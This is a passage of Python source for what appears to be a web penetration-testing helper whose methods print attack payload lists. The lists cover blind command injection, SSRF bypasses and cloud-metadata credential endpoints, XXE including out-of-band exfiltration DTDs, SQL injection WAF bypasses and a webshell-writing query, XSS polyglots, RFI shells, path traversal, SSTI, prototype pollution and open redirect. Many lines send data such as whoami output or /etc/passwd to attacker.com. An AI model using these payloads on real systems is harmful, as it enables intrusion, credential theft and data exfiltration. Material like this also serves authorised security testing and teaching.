            for p in payloads[context]:
                result.append(f"  {p}")
        else:
            for ctx, pays in payloads.items():
                result.append(f"\n{ctx.upper()} payloads:")
                for p in pays:
                    result.append(f"  {p}")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.CRITICAL,
        description="Blind command injection techniques can execute arbitrary OS commands without visible output, using time delays, out-of-band DNS/HTTP channels, or file writes for detection"
    )
    def cmd_blind(self, technique: str = "all") -> str:
        """Blind command injection techniques"""
        techniques = {
            "time_based": {
                "description": "Detect via time delays",
                "linux": [
                    "; sleep 5",
                    "| sleep 5",
                    "`sleep 5`",
                    "$(sleep 5)",
                    "; ping -c 5 127.0.0.1",
                ],
                "windows": [
                    "& ping -n 5 127.0.0.1",
                    "| timeout 5",
                    "& waitfor /t 5 pause",
                ]
            },
            "oob_dns": {
                "description": "Out-of-band via DNS lookup",
                "linux": [
                    "; nslookup $(whoami).attacker.com",
                    "; dig $(whoami).attacker.com",
                    "; host $(id | base64).attacker.com",
                    "$(curl attacker.com/$(whoami))",
                ],
                "windows": [
                    "& nslookup %USERNAME%.attacker.com",
                    "& powershell (nslookup $env:username.attacker.com)",
                ]
            },
            "oob_http": {
                "description": "Out-of-band via HTTP request",
                "linux": [
                    "; curl http://attacker.com/$(whoami)",
                    "; wget http://attacker.com/?d=$(id|base64)",
                    "; curl -d @/etc/passwd http://attacker.com/",
                ],
                "windows": [
                    "& powershell (Invoke-WebRequest http://attacker.com/$env:username)",
                    "& certutil -urlcache -f http://attacker.com/%USERNAME%",
                ]
            },
            "file_write": {
                "description": "Write output to accessible file",
                "linux": [
                    "; id > /var/www/html/output.txt",
                    "; id >> /tmp/output.txt",
                ],
                "windows": [
                    "& whoami > C:\\inetpub\\wwwroot\\output.txt",
                ]
            }
        }

        result = ["Blind Command Injection Techniques:", "-" * 50]

        for tech_name, info in techniques.items():
            if technique == "all" or technique == tech_name:
                result.append(f"\n=== {tech_name.upper()} ===")
                result.append(f"Description: {info['description']}")
                result.append("Linux:")
                for p in info['linux']:
                    result.append(f"  {p}")
                result.append("Windows:")
                for p in info['windows']:
                    result.append(f"  {p}")

        return '\n'.join(result)

    # === SSRF ===

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="SSRF payloads can be used to access internal services, cloud metadata endpoints, and bypass network restrictions"
    )
    def ssrf_payloads(self, bypass: bool = True) -> str:
        """SSRF payloads and bypass techniques"""
        basic_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://127.1",
            "http://127.0.1",
        ]

        bypass_payloads = [
            # IP format variations
            "http://2130706433",  # Decimal: 127.0.0.1
            "http://0x7f000001",  # Hex: 127.0.0.1
            "http://0177.0.0.1",  # Octal
            "http://127.0.0.1.nip.io",  # DNS rebinding
            "http://127.0.0.1.xip.io",
            "http://localtest.me",
            "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
            # Protocol variations
            "http://0",
            "http://127.1/",
            "http://127.000.000.001",
            # IPv6
            "http://[0:0:0:0:0:ffff:127.0.0.1]",
            "http://[::ffff:127.0.0.1]",
            "http://[0000::1]",
            # URL encoding
            "http://%31%32%37%2e%30%2e%30%2e%31",  # 127.0.0.1 URL encoded
            # Redirect bypass
            "http://attacker.com/redirect?url=http://127.0.0.1",
            # DNS rebinding
            "http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network",
        ]

        result = ["SSRF Payloads:", "-" * 50]

        result.append("Basic payloads:")
        for p in basic_payloads:
            result.append(f"  {p}")

        if bypass:
            result.append("\nBypass techniques:")
            for p in bypass_payloads:
                result.append(f"  {p}")

        result.append("\nUseful internal endpoints:")
        result.append("  http://127.0.0.1:80/server-status")
        result.append("  http://127.0.0.1:8080/manager/html")
        result.append("  http://127.0.0.1:9200/_cat/indices")  # Elasticsearch
        result.append("  http://127.0.0.1:6379/")  # Redis
        result.append("  http://127.0.0.1:11211/")  # Memcached

        return '\n'.join(result)

    def ssrf_protocols(self) -> str:
        """SSRF protocol handlers"""
        protocols = {
            "file": {
                "description": "Local file read",
                "examples": [
                    "file:///etc/passwd",
                    "file:///c:/windows/win.ini",
                    "file://localhost/etc/passwd",
                ]
            },
            "dict": {
                "description": "DICT protocol - interact with services",
                "examples": [
                    "dict://127.0.0.1:6379/INFO",  # Redis
                    "dict://127.0.0.1:11211/stats",  # Memcached
                ]
            },
            "gopher": {
                "description": "Gopher protocol - raw TCP",
                "examples": [
                    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...",
                    "gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM...",
                ],
                "note": "Use Gopherus tool to generate payloads"
            },
            "ldap": {
                "description": "LDAP protocol",
                "examples": [
                    "ldap://attacker.com/cn=test",
                    "ldaps://attacker.com/cn=test",
                ]
            },
            "tftp": {
                "description": "TFTP protocol (UDP)",
                "examples": [
                    "tftp://attacker.com/file",
                ]
            },
            "php_wrappers": {
                "description": "PHP stream wrappers",
                "examples": [
                    "php://filter/convert.base64-encode/resource=/etc/passwd",
                    "php://input",
                    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                    "expect://id",
                ]
            }
        }

        result = ["SSRF Protocol Handlers:", "-" * 50]

        for proto, info in protocols.items():
            result.append(f"\n=== {proto.upper()} ===")
            result.append(f"Description: {info['description']}")
            result.append("Examples:")
            for ex in info['examples']:
                result.append(f"  {ex}")
            if 'note' in info:
                result.append(f"Note: {info['note']}")

        return '\n'.join(result)

    def ssrf_cloud_metadata(self, provider: str = "all") -> str:
        """Cloud metadata endpoints for SSRF"""
        endpoints = {
            "aws": {
                "metadata_url": "http://169.254.169.254/latest/meta-data/",
                "endpoints": [
                    "/latest/meta-data/",
                    "/latest/meta-data/hostname",
                    "/latest/meta-data/iam/security-credentials/",
                    "/latest/meta-data/iam/security-credentials/{role-name}",
                    "/latest/user-data",
                    "/latest/dynamic/instance-identity/document",
                ],
                "imdsv2": "TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')"
            },
            "gcp": {
                "metadata_url": "http://metadata.google.internal/computeMetadata/v1/",
                "headers": "Metadata-Flavor: Google",
                "endpoints": [
                    "/computeMetadata/v1/project/project-id",
                    "/computeMetadata/v1/instance/hostname",
                    "/computeMetadata/v1/instance/service-accounts/default/token",
                    "/computeMetadata/v1/instance/service-accounts/default/email",
                ]
            },
            "azure": {
                "metadata_url": "http://169.254.169.254/metadata/instance",
                "headers": "Metadata: true",
                "endpoints": [
                    "/metadata/instance?api-version=2021-02-01",
                    "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                ]
            },
            "digitalocean": {
                "metadata_url": "http://169.254.169.254/metadata/v1/",
                "endpoints": [
                    "/metadata/v1/hostname",
                    "/metadata/v1/user-data",
                    "/metadata/v1/dns/nameservers",
                ]
            },
            "alibaba": {
                "metadata_url": "http://100.100.100.200/latest/meta-data/",
                "endpoints": [
                    "/latest/meta-data/",
                    "/latest/meta-data/hostname",
                    "/latest/meta-data/ram/security-credentials/",
                ]
            }
        }

        result = ["Cloud Metadata Endpoints for SSRF:", "-" * 50]

        for cloud, info in endpoints.items():
            if provider == "all" or provider == cloud:
                result.append(f"\n=== {cloud.upper()} ===")
                result.append(f"Base URL: {info['metadata_url']}")
                if 'headers' in info:
                    result.append(f"Required Header: {info['headers']}")
                result.append("Endpoints:")
                for ep in info['endpoints']:
                    result.append(f"  {info['metadata_url'].rstrip('/')}{ep}")
                if 'imdsv2' in info:
                    result.append(f"IMDSv2 Token: {info['imdsv2']}")

        return '\n'.join(result)

    # === XXE ===

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="XXE payloads can be used to read local files, perform SSRF attacks, and cause denial of service"
    )
    def xxe_payloads(self, target: str = "file") -> str:
        """XXE injection payloads"""
        payloads = {
            "file": {
                "description": "Local file read",
                "payloads": [
                    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
                    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>''',
                ]
            },
            "ssrf": {
                "description": "SSRF via XXE",
                "payloads": [
                    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]><foo>&xxe;</foo>''',
                    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>''',
                ]
            },
            "parameter_entity": {
                "description": "Parameter entity XXE (when regular entities blocked)",
                "payloads": [
                    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>test</foo>''',
                ]
            },
            "cdata": {
                "description": "CDATA XXE for binary files",
                "dtd_file": '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY content '%start;%file;%end;'>">''',
                "payload": '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;%all;]><foo>&content;</foo>'''
            },
            "xinclude": {
                "description": "XInclude attack (when DOCTYPE blocked)",
                "payloads": [
                    '''<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>''',
                ]
            }
        }

        result = ["XXE Payloads:", "-" * 50]

        for attack_type, info in payloads.items():
            if target == "all" or target == attack_type:
                result.append(f"\n=== {attack_type.upper()} ===")
                result.append(f"Description: {info['description']}")
                if 'payloads' in info:
                    result.append("Payloads:")
                    for p in info['payloads']:
                        result.append(f"  {p}")
                if 'dtd_file' in info:
                    result.append(f"DTD File:\n{info['dtd_file']}")
                if 'payload' in info:
                    result.append(f"Payload: {info['payload']}")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="Out-of-band XXE can be used to exfiltrate sensitive data via HTTP/FTP/DNS channels"
    )
    def xxe_oob(self, exfil_server: str = "attacker.com") -> str:
        """Out-of-band XXE techniques"""
        result = ["Out-of-Band XXE:", "-" * 50]

        result.append(f"\nExfiltration server: {exfil_server}")

        result.append("\n=== HTTP OOB ===")
        result.append("External DTD (xxe.dtd):")
        result.append(f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{exfil_server}/?d=%file;'>">
%eval;
%exfil;''')

        result.append("\nPayload:")
        result.append(f'''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{exfil_server}/xxe.dtd">%xxe;]>
<foo>test</foo>''')

        result.append("\n=== FTP OOB (for large files) ===")
        result.append("External DTD:")
        result.append(f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{exfil_server}/%file;'>">
%eval;
%exfil;''')

        result.append("\n=== DNS OOB ===")
        result.append(f'''<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.{exfil_server}/'>">
%eval;
%exfil;''')

        result.append("\nTools:")
        result.append("  - xxeserv: https://github.com/staaldraad/xxeserv")
        result.append("  - xxeFTP: https://github.com/BuffaloWill/oxml_xxe")

        return '\n'.join(result)

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="Blind XXE techniques can be used to exfiltrate sensitive data via error messages, PHP wrappers, or cause denial of service through entity expansion attacks"
    )
    def xxe_blind(self) -> str:
        """Blind XXE payloads"""
        result = ["Blind XXE Techniques:", "-" * 50]

        result.append("\n=== Error-based XXE ===")
        result.append("DTD file to trigger error with file contents:")
        result.append('''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;''')

        result.append("\n=== PHP expect wrapper ===")
        result.append('''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>''')

        result.append("\n=== Billion laughs (DoS testing) ===")
        result.append('''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>''')

        result.append("\n=== Detection ===")
        result.append("Send to Burp Collaborator/interactsh:")
        result.append('''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR_URL">]><foo>&xxe;</foo>''')

        return '\n'.join(result)

    # === SQL Injection Advanced ===

    def sql_waf_bypass(self, waf: str = "generic") -> str:
        """SQL injection WAF bypass techniques"""
        techniques = {
            "generic": {
                "case_switching": ["SeLeCt", "uNiOn", "UNION SELECT"],
                "comments": [
                    "/**/",
                    "/*!50000UNION*/",
                    "/**/UNION/**/SELECT/**/",
                    "--",
                    "#",
                    ";%00",
                ],
                "encoding": [
                    "UNION%09SELECT",  # Tab
                    "UNION%0ASELECT",  # Newline
                    "UNION%0DSELECT",  # Carriage return
                    "UNION%0D%0ASELECT",  # CRLF
                    "UN%49ON SEL%45CT",  # URL encoded
                    "UNION%A0SELECT",  # Non-breaking space
                ],
                "null_bytes": [
                    "UNION%00SELECT",
                    "UNI%00ON SELECT",
                ],
                "double_encoding": [
                    "%252f%252a*/UNION%252f%252a*/SELECT",
                    "%2527%2520OR%25201%253D1",
                ],
            },
            "modsecurity": {
                "bypass": [
                    "0xunion+select+1,2,3",
                    "/**//*!50000UNION*//**//*!50000SELECT*//**/",
                    "{`field`}",
                    "select(1)from(dual)",
                ]
            },
            "cloudflare": {
                "bypass": [
                    "/*!00000union*/+/*!00000select*/",
                    "'/**/or/**/1=1/**/--",
                    "'-UNION-SELECT-",
                ]
            }
        }

        result = ["SQL Injection WAF Bypass:", "-" * 50]

        if waf in techniques:
            result.append(f"\n{waf.upper()} Bypass Techniques:")
            for category, payloads in techniques[waf].items():
                result.append(f"\n{category}:")
                for p in payloads:
                    result.append(f"  {p}")
        else:
            for waf_name, techs in techniques.items():
                result.append(f"\n=== {waf_name.upper()} ===")
                for category, payloads in techs.items():
                    result.append(f"{category}:")
                    for p in payloads[:3]:
                        result.append(f"  {p}")

        result.append("\nAlternate function names:")
        result.append("  CONCAT -> CONCAT_WS, GROUP_CONCAT")
        result.append("  CHAR -> CHR, ASCII -> ORD")
        result.append("  SUBSTRING -> MID, SUBSTR, LEFT, RIGHT")
        result.append("  IF -> CASE WHEN, IIF, IFNULL")

        return '\n'.join(result)

    def sql_extract_template(self, dbms: str = "mysql", method: str = "union") -> str:
        """SQL data extraction templates"""
        templates = {
            "mysql": {
                "union": {
                    "databases": "' UNION SELECT schema_name,NULL FROM information_schema.schemata--",
                    "tables": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
                    "columns": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'--",
                    "data": "' UNION SELECT CONCAT(col1,':',col2),NULL FROM target_table--",
                    "file_read": "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
                    "file_write": "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--",
                },
                "blind": {
                    "database_length": "' AND LENGTH(database())={n}--",
                    "database_char": "' AND ASCII(SUBSTRING(database(),{pos},1))={char}--",
                    "table_count": "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())={n}--",
                }
            },
            "mssql": {
                "union": {
                    "databases": "' UNION SELECT name,NULL FROM master..sysdatabases--",
                    "tables": "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
                    "columns": "' UNION SELECT name,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='TARGET_TABLE')--",
                    "version": "' UNION SELECT @@version,NULL--",
                }
            },
            "postgresql": {
                "union": {
                    "databases": "' UNION SELECT datname,NULL FROM pg_database--",
                    "tables": "' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--",
                    "columns": "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='TARGET_TABLE'--",
                    "version": "' UNION SELECT version(),NULL--",
                }
            }
        }

        result = [f"SQL Data Extraction Templates ({dbms.upper()}):", "-" * 50]

        if dbms in templates:
            for method_name, queries in templates[dbms].items():
                if method == "all" or method == method_name:
                    result.append(f"\n=== {method_name.upper()} ===")
                    for query_type, query in queries.items():
                        result.append(f"{query_type}:")
                        result.append(f"  {query}")

        return '\n'.join(result)

    # === XSS Advanced ===

    def xss_filter_bypass(self, context: str = "html") -> str:
        """XSS filter bypass techniques"""
        bypasses = {
            "tag_bypass": [
                "<svg/onload=alert(1)>",
                "<img src=x onerror=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<object data=javascript:alert(1)>",
                "<embed src=javascript:alert(1)>",
                "<video><source onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
            ],
            "encoding_bypass": [
                "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",  # HTML entities
                "%3Cscript%3Ealert(1)%3C/script%3E",  # URL encoding
                "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",  # JS hex
                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # JS unicode
                "<script>\\u0061lert(1)</script>",  # Unicode in JS
                "<img src=x onerror=\\u0061lert(1)>",
            ],
            "case_bypass": [
                "<ScRiPt>alert(1)</ScRiPt>",
                "<IMG SRC=x OnErRoR=alert(1)>",
                "<sVg/OnLoAd=alert(1)>",
            ],
            "null_byte": [
                "<scr\\x00ipt>alert(1)</script>",
                "<img\\x00src=x onerror=alert(1)>",
            ],
            "comment_bypass": [
                "<script>alert(1)<!--",
                "<!--><script>alert(1)</script>",
                "<script>/**/alert(1)/**/</script>",
            ],
            "double_encoding": [
                "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
                "%25%33%43script%25%33%45alert(1)%25%33%43/script%25%33%45",
            ],
            "no_parentheses": [
                "<img src=x onerror=alert`1`>",
                "<img src=x onerror=alert&#40;1&#41;>",
                "<svg onload=alert&lpar;1&rpar;>",
                "<img src=x onerror=window['alert'](1)>",
                "<img src=x onerror=top['al'+'ert'](1)>",
            ],
            "no_spaces": [
                "<svg/onload=alert(1)>",
                "<img/src=x/onerror=alert(1)>",
                "<svg\\x0aonload=alert(1)>",  # newline
                "<svg\\x09onload=alert(1)>",  # tab
                "<svg\\x0conload=alert(1)>",  # form feed
            ]
        }

        result = ["XSS Filter Bypass Techniques:", "-" * 50]

        for category, payloads in bypasses.items():
            result.append(f"\n=== {category.upper()} ===")
            for p in payloads:
                result.append(f"  {p}")

        result.append("\n=== ADDITIONAL TECHNIQUES ===")
        result.append("  - Use data: URIs")
        result.append("  - Use SVG with embedded script")
        result.append("  - Use mutation XSS (mXSS)")
        result.append("  - Use DOM clobbering")

        return '\n'.join(result)

    def xss_polyglot(self) -> str:
        """XSS polyglot payloads that work in multiple contexts"""
        polyglots = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "'\"-->]]>*/</script></style></title></textarea><script>alert(1)</script>",
            "'\"><img src=x onerror=alert(1)>",
            "javascript:alert(1)//';alert(1)//\";alert(1)//';alert(1)//\";alert(1)//`--></title></textarea></style></script><svg/onload=alert(1)>",
            "-->'\"<svg onload=alert(1)>",
            "\"><script>alert(1)</script>",
            "'-alert(1)-'",
            "\\'-alert(1)//",
            "</script><script>alert(1)</script>",
            "<img/src='x'onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",  # Angular template injection
            "${alert(1)}",  # Template literal
            "#{alert(1)}",  # Ruby ERB
        ]

        result = ["XSS Polyglot Payloads:", "-" * 50]
        result.append("These payloads work in multiple contexts:\n")

        for i, p in enumerate(polyglots, 1):
            result.append(f"{i}. {p}")

        result.append("\n" + "-" * 50)
        result.append("Usage:")
        result.append("  1. Try polyglots when context is unknown")
        result.append("  2. Useful for automated scanning")
        result.append("  3. Helps bypass simple filters")

        return '\n'.join(result)

    # === RFI/Path Traversal ===

    @dangerous_operation(
        risk_level=RiskLevel.HIGH,
        description="Remote File Inclusion (RFI) can lead to remote code execution by including malicious remote files"
    )
    def rfi_payloads(self) -> str:
        """Remote File Inclusion payloads"""
        payloads = [
            "http://attacker.com/shell.txt",
            "http://attacker.com/shell.txt%00",
            "http://attacker.com/shell.txt?",
            "//attacker.com/shell.txt",
            "\\\\attacker.com\\shell.txt",
            "http://attacker.com/shell.txt%00.jpg",
            "http://attacker.com/shell.txt%2500.jpg",
            "httP://attacker.com/shell.txt",
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
        ]

        result = ["Remote File Inclusion Payloads:", "-" * 50]
        result.append("Basic RFI:")
        for p in payloads:
            result.append(f"  {p}")

        result.append("\n=== BYPASS TECHNIQUES ===")
        result.append("  Double URL encoding: http%253A%252F%252Fattacker.com%252Fshell.txt")
        result.append("  Case variation: HtTp://attacker.com/shell.txt")
        result.append("  Null byte: http://attacker.com/shell.txt%00.jpg")
        result.append("  Parameter pollution: ?file=allowed.jpg&file=http://attacker.com/shell.txt")

        result.append("\n=== PHP SPECIFIC ===")
        result.append("  allow_url_include must be ON")
        result.append("  Check with: ?file=data://text/plain,<?php phpinfo(); ?>")

        return '\n'.join(result)

    def path_traversal(self, os_type: str = "linux") -> str:
        """Path traversal payloads and bypass techniques"""
        traversal_sequences = [
            "../",
            "..\\",
            "..%2f",
            "..%5c",
            "%2e%2e/",
            "%2e%2e%2f",
            "..%252f",  # Double encoding
            "..%c0%af",  # UTF-8 encoding
            "..%c1%9c",  # UTF-8 encoding
            "....//",
            "....\\\\",
            "..../",
            "....\\",
            "%252e%252e%252f",  # Triple encoding
        ]

        linux_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/issue",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/var/log/apache2/access.log",
            "/var/log/auth.log",
        ]

        windows_files = [
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\",
        ]

        result = ["Path Traversal Payloads:", "-" * 50]

        result.append("\n=== TRAVERSAL SEQUENCES ===")
        for seq in traversal_sequences:
            result.append(f"  {seq}")

        result.append("\n=== TARGET FILES ===")
        files = linux_files if os_type == "linux" else windows_files
        for f in files:
            result.append(f"  {f}")

        result.append("\n=== COMMON PAYLOADS ===")
        depths = range(1, 10)
        for d in depths[:5]:
            seq = "../" * d
            target = "etc/passwd" if os_type == "linux" else "Windows\\win.ini"
            result.append(f"  {seq}{target}")

        result.append("\n=== BYPASS TECHNIQUES ===")
        result.append("  ....//....//etc/passwd (filter bypass)")
        result.append("  ..%252f..%252fetc/passwd (double encoding)")
        result.append("  /etc/passwd%00.jpg (null byte)")
        result.append("  /var/www/html/../../../etc/passwd (absolute path)")

        return '\n'.join(result)

    # === SSTI ===

    def ssti_identify(self) -> str:
        """Identify template engine for SSTI"""
        detection_payloads = {
            "initial": {
                "${7*7}": "49 = Expression Language / Freemarker / Thymeleaf",
                "{{7*7}}": "49 = Jinja2 / Twig / Nunjucks / AngularJS",
                "{{7*'7'}}": "7777777 = Jinja2 | 49 = Twig",
                "#{7*7}": "49 = Ruby ERB / Java EL",
                "<%= 7*7 %>": "49 = Ruby ERB / EJS",
                "${{7*7}}": "49 = Velocity",
                "{7*7}": "49 = Smarty / Mako",
                "{{= 7*7}}": "49 = Handlebars (custom config)",
                "*{7*7}": "49 = Thymeleaf",
            }
        }

        engine_fingerprints = {
            "jinja2": [
                "{{config}}",
                "{{self.__class__}}",
                "{{request.application}}",
            ],
            "twig": [
                "{{_self.env}}",
                "{{app.request}}",
            ],
            "freemarker": [
                "${.version}",
                "${.current_template_name}",
            ],
            "velocity": [
                "$class.inspect('java.lang.Runtime')",
            ],
            "smarty": [
                "{$smarty.version}",
            ],
            "mako": [
                "${self.module}",
            ],
            "erb": [
                "<%= self.class %>",
                "<%= File.open('/etc/passwd').read %>",
            ]
        }

        result = ["SSTI Template Engine Identification:", "-" * 50]

        result.append("\n=== STEP 1: INITIAL DETECTION ===")
        result.append("Try these payloads to detect SSTI:")
        for payload, indication in detection_payloads["initial"].items():
            result.append(f"  {payload} → {indication}")

        result.append("\n=== STEP 2: ENGINE FINGERPRINTING ===")
        for engine, payloads in engine_fingerprints.items():
            result.append(f"\n{engine.upper()}:")
            for p in payloads:
                result.append(f"  {p}")

        result.append("\n=== DECISION TREE ===")
        result.append("  {{7*7}} returns 49?")
        result.append("    → Yes: {{7*'7'}} returns 7777777? → Jinja2")
        result.append("    → Yes: {{7*'7'}} returns 49? → Twig")
        result.append("  ${7*7} returns 49? → FreeMarker / Velocity / Thymeleaf")
        result.append("  #{7*7} returns 49? → Ruby ERB")

        return '\n'.join(result)

    # === Prototype Pollution ===

    def prototype_pollution(self) -> str:
        """JavaScript prototype pollution payloads"""
        payloads = {
            "json_merge": [
                '{"__proto__": {"admin": true}}',
                '{"constructor": {"prototype": {"admin": true}}}',
                '{"__proto__": {"isAdmin": true}}',
            ],
            "url_params": [
                "?__proto__[admin]=1",
                "?__proto__.admin=1",
                "?constructor[prototype][admin]=1",
                "?constructor.prototype.admin=1",
            ],
            "nested": [
                '{"a": {"__proto__": {"b": 1}}}',
                '{"a": 1, "__proto__": {"b": 2}}',
            ],
            "rce_payloads": [
                '{"__proto__": {"shell": "/proc/self/exe", "argv": ["-c", "id"]}}',
                '{"__proto__": {"NODE_OPTIONS": "--require=/proc/self/cmdline"}}',
                '{"__proto__": {"env": {"EVIL": "() { :; }; /bin/sh -c \'id\'"}}}',
            ]
        }

        result = ["JavaScript Prototype Pollution:", "-" * 50]

        for category, payloads_list in payloads.items():
            result.append(f"\n=== {category.upper()} ===")
            for p in payloads_list:
                result.append(f"  {p}")

        result.append("\n=== DETECTION ===")
        result.append("  1. Look for deep merge functions")
        result.append("  2. Check if user input is merged into objects")
        result.append("  3. Test: Object.prototype.polluted = 1; ({}).polluted === 1")

        result.append("\n=== IMPACT ===")
        result.append("  - Authentication bypass")
        result.append("  - Remote code execution (in Node.js)")
        result.append("  - Denial of service")
        result.append("  - Property injection")

        return '\n'.join(result)

    # === Open Redirect ===

    def open_redirect(self) -> str:
        """Open redirect payloads and bypass techniques"""
        payloads = [
            "//attacker.com",
            "///attacker.com",
            "////attacker.com",
            "https:attacker.com",
            "https:/attacker.com",
            "//attacker.com/path",
            "/\\attacker.com",
            "\\/attacker.com",
            "//attacker.com%2f%2e%2e",
            "//attacker.com/%2f..",
            "http://attacker.com",
            "https://attacker.com",
            "//attacker%E3%80%82com",  # Unicode dot
            "////attacker.com@trusted.com",
            "https://trusted.com@attacker.com",
            "https://attacker.com#trusted.com",
            "https://attacker.com?trusted.com",
            "https://trusted.com.attacker.com",
            "https://attackertrusted.com",
            "jaVascript:alert(document.domain)",
            "data:text/html,<script>alert(1)</script>",
            "%0d%0aLocation:%20http://attacker.com",  # CRLF
        ]

        result = ["Open Redirect Payloads:", "-" * 50]

        result.append("Basic payloads:")
        for p in payloads[:10]:
            result.append(f"  {p}")

        result.append("\n=== BYPASS TECHNIQUES ===")
        for p in payloads[10:]:
            result.append(f"  {p}")

        result.append("\n=== PARAMETER NAMES TO TEST ===")
        result.append("  url, redirect, next, return, returnUrl, redir")
        result.append("  redirect_uri, callback, continue, dest, destination")
        result.append("  go, goto, target, link, location, uri, path")

        result.append("\n=== IMPACT ===")
        result.append("  - Phishing attacks")
        result.append("  - OAuth token theft")
        result.append("  - Bypass referer checks")

        return '\n'.join(result)

    # === CSRF ===

    def csrf_token_bypass(self) -> str:
        """CSRF token bypass techniques"""
        techniques = {
            "token_validation": [
                "Remove the CSRF token parameter entirely",
                "Use an empty CSRF token value",
                "Use a random/arbitrary CSRF token value",
                "Use another user's CSRF token (if tied to session)",
                "Use an old/expired CSRF token",
            ],
            "method_bypass": [
                "Change POST to GET (if accepted)",
                "Change POST to PUT/PATCH/DELETE",
                "Override method: X-HTTP-Method-Override: POST",
                "Override method: _method=POST parameter",
            ],
            "content_type": [
                "Change Content-Type to text/plain",
                "Change Content-Type to application/x-www-form-urlencoded",
                "Remove Content-Type header",
                "Use multipart/form-data",
            ],
            "referer_bypass": [
                "Remove Referer header",
                "Set Referer to target domain (if regex check)",
                "Set Referer: https://target.com.attacker.com",
                "Set Referer: https://attacker.com/target.com",
                "Use Referrer-Policy: no-referrer",
            ],
            "cors_bypass": [
                "Flash-based CSRF",
                "PDF-based CSRF",
                "SWF file with crossdomain.xml",
            ]
        }

        result = ["CSRF Token Bypass Techniques:", "-" * 50]

